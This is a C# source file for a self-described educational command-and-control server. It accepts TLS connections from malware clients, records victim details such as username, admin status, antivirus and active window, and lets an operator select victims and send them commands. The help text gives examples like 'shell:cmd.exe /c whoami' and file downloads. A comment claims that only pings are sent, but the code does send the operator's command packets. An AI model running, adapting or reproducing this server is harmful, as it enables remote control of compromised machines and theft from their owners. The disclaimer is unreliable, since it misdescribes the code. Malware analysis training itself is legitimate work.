// =============================================================================
// EDUCATIONAL C2 SERVER (Command & Control)
// =============================================================================
// This is a simplified C2 server for learning how malware communication works.
// For cybersecurity education and malware analysis training only.
// 
// This server will:
// 1. Listen for incoming connections from malware clients
// 2. Display victim information when they connect
// 3. Allow you to send commands to the victim
// 4. Show the full client-server relationship
// =============================================================================

using System;
using System.Collections.Generic;
using System.IO;
using System.IO.Compression;
using System.Net;
using System.Net.Security;
using System.Net.Sockets;
using System.Security.Authentication;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Threading;

namespace C2Server
{
    // =========================================================================
    // VICTIM INFORMATION - stored for each connected client
    // =========================================================================
    public class VictimInfo
    {
        public string HWID { get; set; } = "";
        public string Username { get; set; } = "";
        public string OS { get; set; } = "";
        public string Path { get; set; } = "";
        public string Version { get; set; } = "";
        public string IsAdmin { get; set; } = "";
        public string Antivirus { get; set; } = "";
        public string Group { get; set; } = "";
        public string ActiveWindow { get; set; } = "";
        public DateTime ConnectedAt { get; set; }
        public SslStream Stream { get; set; }
        public Socket Socket { get; set; }
        public int ID { get; set; }
    }

    // =========================================================================
    // MAIN C2 SERVER CLASS
    // =========================================================================
    class Program
    {
        // Server configuration
        private const int DEFAULT_PORT = 4444;
        private const int MAX_CLIENTS = 100;
        
        // Connected victims
        private static Dictionary<int, VictimInfo> victims = new Dictionary<int, VictimInfo>();
        private static int nextVictimId = 1;
        private static object victimsLock = new object();
        
        // SSL Certificate for encrypted communication
        private static X509Certificate2? serverCertificate;
        
        // Server state
        private static bool isRunning = true;
        private static TcpListener? listener;

        static void Main(string[] args)
        {
            PrintBanner();
            
            // Get port from user or use default
            int port = DEFAULT_PORT;
            Console.Write($"[?] Enter port to listen on (default {DEFAULT_PORT}): ");
            string? portInput = Console.ReadLine();
            if (!string.IsNullOrWhiteSpace(portInput) && int.TryParse(portInput, out int customPort))
            {
                port = customPort;
            }

            // Generate self-signed certificate for SSL/TLS
            Console.WriteLine("\n[*] Generating SSL certificate for encrypted communication...");
            serverCertificate = GenerateSelfSignedCertificate();
            Console.WriteLine("[+] SSL certificate generated successfully!");

            // Start the C2 server
            StartServer(port);
        }

        static void PrintBanner()
        {
            Console.Clear();
            Console.ForegroundColor = ConsoleColor.Red;
            Console.WriteLine(@"
╔══════════════════════════════════════════════════════════════╗
║                                                              ║
║     ██████╗██╗  ██╗ █████╗ ██╗   ██╗                         ║
║    ██╔════╝██║  ██║██╔══██╗██║   ██║                         ║
║    ██║     ███████║███████║██║   ██║                         ║
║    ██║     ██╔══██║██╔══██║██║   ██║                         ║
║    ╚██████╗██║  ██║██║  ██║╚██████╔╝                         ║
║     ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝                          ║
║                                                              ║
║           EDUCATIONAL C2 SERVER v1.0                         ║
║         For Malware Analysis Training Only                   ║
║                                                              ║
╚══════════════════════════════════════════════════════════════╝
");
            Console.ResetColor();
            Console.WriteLine("⚠️  This server is for EDUCATIONAL PURPOSES ONLY\n");
        }

        // =========================================================================
        // START THE TCP SERVER
        // =========================================================================
        static void StartServer(int port)
        {
            try
            {
                // Create TCP listener on all interfaces
                listener = new TcpListener(IPAddress.Any, port);
                listener.Start();
                
                Console.WriteLine($"[+] C2 Server started on port {port}");
                Console.WriteLine($"[+] Listening for incoming connections...");
                Console.WriteLine($"[+] Your IP addresses:");
                
                // Show all available IP addresses
                foreach (var ip in Dns.GetHostEntry(Dns.GetHostName()).AddressList)
                {
                    if (ip.AddressFamily == AddressFamily.InterNetwork)
                    {
                        Console.WriteLine($"    • {ip}");
                    }
                }
                
                Console.WriteLine("\n" + new string('─', 60));
                Console.WriteLine("COMMANDS:");
                Console.WriteLine("  list     - Show all connected victims");
                Console.WriteLine("  select N - Select victim by ID");
                Console.WriteLine("  cmd      - Send command to selected victim");
                Console.WriteLine("  ping     - Ping selected victim");
                Console.WriteLine("  help     - Show this help");
                Console.WriteLine("  exit     - Shutdown server");
                Console.WriteLine(new string('─', 60) + "\n");

                // Start accepting connections in background
                Thread acceptThread = new Thread(AcceptConnections);
                acceptThread.IsBackground = true;
                acceptThread.Start();

                // Start command processor in main thread
                ProcessCommands();
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[!] Error starting server: {ex.Message}");
            }
        }

        // =========================================================================
        // ACCEPT INCOMING CONNECTIONS
        // =========================================================================
        static void AcceptConnections()
        {
            while (isRunning)
            {
                try
                {
                    if (listener == null) break;
                    
                    // Wait for client connection
                    TcpClient tcpClient = listener.AcceptTcpClient();
                    
                    Console.WriteLine($"\n[*] New connection from: {tcpClient.Client.RemoteEndPoint}");
                    
                    // Handle client in separate thread
                    Thread clientThread = new Thread(() => HandleClient(tcpClient));
                    clientThread.IsBackground = true;
                    clientThread.Start();
                }
                catch (Exception ex)
                {
                    if (isRunning)
                    {
                        Console.WriteLine($"[!] Accept error: {ex.Message}");
                    }
                }
            }
        }

        // =========================================================================
        // HANDLE CLIENT CONNECTION
        // =========================================================================
        static void HandleClient(TcpClient tcpClient)
        {
            VictimInfo victim = new VictimInfo();
            Socket socket = tcpClient.Client;
            
            try
            {
                // Wrap in SSL stream
                SslStream sslStream = new SslStream(tcpClient.GetStream(), false);
                
                // Authenticate with self-signed certificate
                sslStream.AuthenticateAsServer(serverCertificate, clientCertificateRequired: false, 
                    enabledSslProtocols: SslProtocols.Tls12, checkCertificateRevocation: false);
                
                Console.WriteLine("[+] SSL/TLS connection established!");
                
                victim.Socket = socket;
                victim.Stream = sslStream;
                victim.ConnectedAt = DateTime.Now;
                
                // Receive initial client info
                byte[]? data = ReceiveData(sslStream);
                if (data != null)
                {
                    ProcessClientInfo(victim, data);
                    
                    // Add to victims list
                    lock (victimsLock)
                    {
                        victim.ID = nextVictimId++;
                        victims[victim.ID] = victim;
                    }
                    
                    Console.ForegroundColor = ConsoleColor.Green;
                    Console.WriteLine($"\n[+] NEW VICTIM CONNECTED (ID: {victim.ID})");
                    Console.WriteLine($"    HWID:      {victim.HWID}");
                    Console.WriteLine($"    Username:  {victim.Username}");
                    Console.WriteLine($"    OS:        {victim.OS}");
                    Console.WriteLine($"    Admin:     {victim.IsAdmin}");
                    Console.WriteLine($"    Antivirus: {victim.Antivirus}");
                    Console.WriteLine($"    Path:      {victim.Path}");
                    Console.WriteLine($"    Group:     {victim.Group}");
                    Console.ResetColor();
                    Console.Write("\nC2> ");
                    
                    // Start listening for client messages
                    ListenForClientMessages(victim);
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[!] Client handling error: {ex.Message}");
            }
            finally
            {
                // Remove from victims list
                if (victim.ID > 0)
                {
                    lock (victimsLock)
                    {
                        victims.Remove(victim.ID);
                    }
                    Console.WriteLine($"[!] Victim {victim.ID} disconnected");
                }
                
                try { victim.Stream?.Close(); } catch { }
                try { socket?.Close(); } catch { }
            }
        }

        // =========================================================================
        // PROCESS INITIAL CLIENT INFO
        // =========================================================================
        static void ProcessClientInfo(VictimInfo victim, byte[] data)
        {
            try
            {
                // Decompress and decode MessagePack data
                byte[] decompressed = Decompress(data);
                Dictionary<string, string> info = DecodeMessagePack(decompressed);
                
                if (info.ContainsKey("HWID")) victim.HWID = info["HWID"];
                if (info.ContainsKey("User")) victim.Username = info["User"];
                if (info.ContainsKey("OS")) victim.OS = info["OS"];
                if (info.ContainsKey("Path")) victim.Path = info["Path"];
                if (info.ContainsKey("Version")) victim.Version = info["Version"];
                if (info.ContainsKey("Admin")) victim.IsAdmin = info["Admin"];
                if (info.ContainsKey("Antivirus")) victim.Antivirus = info["Antivirus"];
                if (info.ContainsKey("Group")) victim.Group = info["Group"];
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[!] Error processing client info: {ex.Message}");
            }
        }

        // =========================================================================
        // LISTEN FOR MESSAGES FROM CLIENT
        // =========================================================================
        static void ListenForClientMessages(VictimInfo victim)
        {
            while (victim.Stream != null && victim.Socket != null && victim.Socket.Connected)
            {
                try
                {
                    byte[]? data = ReceiveData(victim.Stream);
                    if (data != null)
                    {
                        ProcessClientMessage(victim, data);
                    }
                    else
                    {
                        break; // Client disconnected
                    }
                }
                catch
                {
                    break;
                }
            }
        }

        // =========================================================================
        // PROCESS MESSAGES FROM CLIENT
        // =========================================================================
        static void ProcessClientMessage(VictimInfo victim, byte[] data)
        {
            try
            {
                byte[] decompressed = Decompress(data);
                Dictionary<string, string> message = DecodeMessagePack(decompressed);
                
                string packetType = message.ContainsKey("Packet") ? message["Packet"] : "Unknown";
                
                switch (packetType)
                {
                    case "Ping":
                        Console.WriteLine($"\n[*] Ping from {victim.ID}: Active window = {message.GetValueOrDefault("Message", "N/A")}");
                        victim.ActiveWindow = message.GetValueOrDefault("Message", "");
                        
                        // Send pong response
                        SendPong(victim.Stream);
                        break;
                        
                    case "pong":
                        Console.WriteLine($"\n[*] Pong from {victim.ID}: Latency = {message.GetValueOrDefault("Message", "0")} intervals");
                        break;
                        
                    case "Received":
                        Console.WriteLine($"\n[*] Victim {victim.ID} acknowledged command");
                        break;
                        
                    case "Error":
                        Console.WriteLine($"\n[!] Error from victim {victim.ID}: {message.GetValueOrDefault("Error", "Unknown")}");
                        break;
                        
                    case "sendPlugin":
                        Console.WriteLine($"\n[*] Victim {victim.ID} requesting plugin: {message.GetValueOrDefault("Hashes", "N/A")}");
                        break;
                        
                    default:
                        Console.WriteLine($"\n[*] Unknown packet from {victim.ID}: {packetType}");
                        break;
                }
                
                Console.Write("C2> ");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[!] Error processing message: {ex.Message}");
            }
        }

        // =========================================================================
        // COMMAND PROCESSOR - Handles user input
        // =========================================================================
        static VictimInfo? selectedVictim = null;

        static void ProcessCommands()
        {
            while (isRunning)
            {
                Console.Write("C2> ");
                string? input = Console.ReadLine()?.Trim().ToLower();
                
                if (string.IsNullOrEmpty(input)) continue;
                
                string[] parts = input.Split(' ', 2);
                string command = parts[0];
                string args = parts.Length > 1 ? parts[1] : "";
                
                switch (command)
                {
                    case "list":
                        ListVictims();
                        break;
                        
                    case "select":
                        SelectVictim(args);
                        break;
                        
                    case "cmd":
                        SendCommand(args);
                        break;
                        
                    case "ping":
                        SendPing();
                        break;
                        
                    case "help":
                        ShowHelp();
                        break;
                        
                    case "exit":
                    case "quit":
                        Shutdown();
                        break;
                        
                    default:
                        Console.WriteLine("[!] Unknown command. Type 'help' for available commands.");
                        break;
                }
            }
        }

        // =========================================================================
        // COMMAND: LIST ALL CONNECTED VICTIMS
        // =========================================================================
        static void ListVictims()
        {
            lock (victimsLock)
            {
                if (victims.Count == 0)
                {
                    Console.WriteLine("[*] No victims connected");
                    return;
                }
                
                Console.WriteLine("\n" + new string('─', 70));
                Console.WriteLine($"{"ID",-4} {"HWID",-20} {"User",-15} {"OS",-20} {"Admin",-6}");
                Console.WriteLine(new string('─', 70));
                
                foreach (var victim in victims.Values)
                {
                    string selected = victim == selectedVictim ? " *" : "";
                    Console.WriteLine($"{victim.ID,-4} {victim.HWID.Substring(0, Math.Min(20, victim.HWID.Length)),-20} {victim.Username,-15} {Truncate(victim.OS, 20),-20} {victim.IsAdmin,-6}{selected}");
                }
                
                Console.WriteLine(new string('─', 70));
                Console.WriteLine($"Total: {victims.Count} victim(s) connected\n");
            }
        }

        // =========================================================================
        // COMMAND: SELECT A VICTIM
        // =========================================================================
        static void SelectVictim(string args)
        {
            if (string.IsNullOrEmpty(args) || !int.TryParse(args, out int id))
            {
                Console.WriteLine("[!] Usage: select <ID>");
                return;
            }
            
            lock (victimsLock)
            {
                if (victims.TryGetValue(id, out VictimInfo? victim))
                {
                    selectedVictim = victim;
                    Console.WriteLine($"[+] Selected victim {id} ({victim.Username})");
                }
                else
                {
                    Console.WriteLine($"[!] Victim {id} not found");
                }
            }
        }

        // =========================================================================
        // COMMAND: SEND COMMAND TO SELECTED VICTIM
        // =========================================================================
        static void SendCommand(string args)
        {
            if (selectedVictim == null)
            {
                Console.WriteLine("[!] No victim selected. Use 'select <ID>' first.");
                return;
            }
            
            if (string.IsNullOrEmpty(args))
            {
                Console.WriteLine("[!] Usage: cmd <command>");
                Console.WriteLine("    Example commands:");
                Console.WriteLine("      • shell:cmd.exe /c whoami");
                Console.WriteLine("      • shell:cmd.exe /c ipconfig");
                Console.WriteLine("      • download:C:\\temp\\file.txt");
                return;
            }
            
            // In a real C2, this would send an actual command
            // For this educational version, we'll just send a ping
            Console.WriteLine($"[*] Sending command to victim {selectedVictim.ID}: {args}");
            
            // Build command packet
            byte[] packet = BuildCommandPacket(args);
            SendData(selectedVictim.Stream, packet);
        }

        // =========================================================================
        // COMMAND: PING SELECTED VICTIM
        // =========================================================================
        static void SendPing()
        {
            if (selectedVictim == null)
            {
                Console.WriteLine("[!] No victim selected. Use 'select <ID>' first.");
                return;
            }
            
            Console.WriteLine($"[*] Sending ping to victim {selectedVictim.ID}...");
            
            // Send ping packet
            byte[] packet = BuildPingPacket();
            SendData(selectedVictim.Stream, packet);
        }

        // =========================================================================
        // SHOW HELP
        // =========================================================================
        static void ShowHelp()
        {
            Console.WriteLine(@"
COMMANDS:
  list              - Show all connected victims
  select <ID>       - Select a victim by ID
  cmd <command>     - Send command to selected victim
  ping              - Ping selected victim
  help              - Show this help message
  exit              - Shutdown the C2 server

EXAMPLE SESSION:
  C2> list                    (see connected victims)
  C2> select 1                (select victim #1)
  C2> ping                    (ping selected victim)
  C2> cmd shell:whoami        (send command)
");
        }

        // =========================================================================
        // SHUTDOWN SERVER
        // =========================================================================
        static void Shutdown()
        {
            Console.WriteLine("\n[*] Shutting down C2 server...");
            isRunning = false;
            
            // Close all client connections
            lock (victimsLock)
            {
                foreach (var victim in victims.Values)
                {
                    try
                    {
                        victim.Stream?.Close();
                        victim.Socket?.Close();
                    }
                    catch { }
                }
                victims.Clear();
            }
            
            listener?.Stop();
            Console.WriteLine("[+] Server stopped. Goodbye!");
            Environment.Exit(0);
        }

        // =========================================================================
        // NETWORK COMMUNICATION HELPERS
        // =========================================================================

        static byte[]? ReceiveData(SslStream stream)
        {
            try
            {
                // Read 4-byte length header
                byte[] lengthBytes = new byte[4];
                int read = stream.Read(lengthBytes, 0, 4);
                if (read < 4) return null;
                
                int length = BitConverter.ToInt32(lengthBytes, 0);
                if (length <= 0 || length > 10_000_000) return null;
                
                // Read data
                byte[] buffer = new byte[length];
                int totalRead = 0;
                while (totalRead < length)
                {
                    read = stream.Read(buffer, totalRead, length - totalRead);
                    if (read <= 0) return null;
                    totalRead += read;
                }
                
                return buffer;
            }
            catch
            {
                return null;
            }
        }

        static void SendData(SslStream? stream, byte[] data)
        {
            if (stream == null) return;
            
            try
            {
                // Send length header + data
                byte[] lengthBytes = BitConverter.GetBytes(data.Length);
                stream.Write(lengthBytes, 0, 4);
                stream.Write(data, 0, data.Length);
                stream.Flush();
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[!] Send error: {ex.Message}");
            }
        }

        static void SendPong(SslStream stream)
        {
            // Build pong response packet
            byte[] packet = BuildMessagePack(new Dictionary<string, string>
            {
                { "Packet", "pong" },
                { "Message", "0" }
            });
            
            SendData(stream, packet);
        }

        // =========================================================================
        // MESSAGEPACK ENCODING/DECODING (Simplified)
        // =========================================================================

        static byte[] BuildCommandPacket(string command)
        {
            return BuildMessagePack(new Dictionary<string, string>
            {
                { "Packet", "command" },
                { "Command", command }
            });
        }

        static byte[] BuildPingPacket()
        {
            return BuildMessagePack(new Dictionary<string, string>
            {
                { "Packet", "ping" }
            });
        }

        static byte[] BuildMessagePack(Dictionary<string, string> data)
        {
            using MemoryStream ms = new MemoryStream();
            
            // Simple map format
            ms.WriteByte((byte)(128 + data.Count)); // fixmap with N elements
            
            foreach (var kvp in data)
            {
                // Write key
                byte[] keyBytes = Encoding.UTF8.GetBytes(kvp.Key);
                ms.WriteByte((byte)(160 + keyBytes.Length));
                ms.Write(keyBytes, 0, keyBytes.Length);
                
                // Write value
                byte[] valueBytes = Encoding.UTF8.GetBytes(kvp.Value);
                if (valueBytes.Length <= 31)
                {
                    ms.WriteByte((byte)(160 + valueBytes.Length));
                    ms.Write(valueBytes, 0, valueBytes.Length);
                }
                else
                {
                    ms.WriteByte(217); // str8
                    ms.WriteByte((byte)valueBytes.Length);
                    ms.Write(valueBytes, 0, valueBytes.Length);
                }
            }
            
            return Compress(ms.ToArray());
        }

        static Dictionary<string, string> DecodeMessagePack(byte[] data)
        {
            Dictionary<string, string> result = new Dictionary<string, string>();
            
            try
            {
                using MemoryStream ms = new MemoryStream(data);
                byte b = (byte)ms.ReadByte();
                
                if (b >= 128 && b <= 143) // fixmap
                {
                    int count = b - 128;
                    for (int i = 0; i < count; i++)
                    {
                        string key = ReadString(ms);
                        string value = ReadString(ms);
                        result[key] = value;
                    }
                }
            }
            catch { }
            
            return result;
        }

        static string ReadString(Stream ms)
        {
            byte b = (byte)ms.ReadByte();
            int length = 0;
            
            if (b >= 160 && b <= 191)
            {
                length = b - 160;
            }
            else if (b == 217)
            {
                length = ms.ReadByte();
            }
            else if (b == 218)
            {
                byte[] lenBytes = new byte[2];
                ms.Read(lenBytes, 0, 2);
                length = (lenBytes[0] << 8) | lenBytes[1];
            }
            
            if (length > 0)
            {
                byte[] strBytes = new byte[length];
                ms.Read(strBytes, 0, length);
                return Encoding.UTF8.GetString(strBytes);
            }
            
            return "";
        }

        // =========================================================================
        // COMPRESSION HELPERS
        // =========================================================================

        static byte[] Compress(byte[] data)
        {
            using MemoryStream ms = new MemoryStream();
            ms.Write(BitConverter.GetBytes(data.Length), 0, 4);
            using (GZipStream gzip = new GZipStream(ms, CompressionMode.Compress, leaveOpen: true))
            {
                gzip.Write(data, 0, data.Length);
            }
            return ms.ToArray();
        }

        static byte[] Decompress(byte[] data)
        {
            using MemoryStream ms = new MemoryStream(data);
            byte[] lenBytes = new byte[4];
            ms.Read(lenBytes, 0, 4);
            int length = BitConverter.ToInt32(lenBytes, 0);
            
            using GZipStream gzip = new GZipStream(ms, CompressionMode.Decompress);
            byte[] result = new byte[length];
            gzip.Read(result, 0, length);
            return result;
        }

        // =========================================================================
        // SSL CERTIFICATE GENERATION
        // =========================================================================

        static X509Certificate2 GenerateSelfSignedCertificate()
        {
            // Generate a self-signed certificate for SSL/TLS
            // This is a simplified version - in production, use proper certificate management
            
            using RSA rsa = RSA.Create(2048);
            
            var request = new CertificateRequest(
                "CN=MalwareAnalysis-C2",
                rsa,
                HashAlgorithmName.SHA256,
                RSASignaturePadding.Pkcs1);
            
            // Add basic constraints
            request.CertificateExtensions.Add(
                new System.Security.Cryptography.X509Certificates.X509BasicConstraintsExtension(
                    certificateAuthority: false,
                    hasPathLengthConstraint: false,
                    pathLengthConstraint: 0,
                    critical: true));
            
            // Add key usage
            request.CertificateExtensions.Add(
                new System.Security.Cryptography.X509Certificates.X509KeyUsageExtension(
                    System.Security.Cryptography.X509Certificates.X509KeyUsageFlags.DigitalSignature | 
                    System.Security.Cryptography.X509Certificates.X509KeyUsageFlags.KeyEncipherment,
                    critical: true));
            
            // Create self-signed certificate (valid for 1 year)
            var certificate = request.CreateSelfSigned(
                DateTimeOffset.Now.AddDays(-1),
                DateTimeOffset.Now.AddYears(1));
            
            return new X509Certificate2(certificate.Export(X509ContentType.Pfx, "password"), "password");
        }

        // =========================================================================
        // UTILITY FUNCTIONS
        // =========================================================================

        static string Truncate(string s, int maxLength)
        {
            if (string.IsNullOrEmpty(s) || s.Length <= maxLength) return s ?? "";
            return s.Substring(0, maxLength - 3) + "...";
        }
    }
}
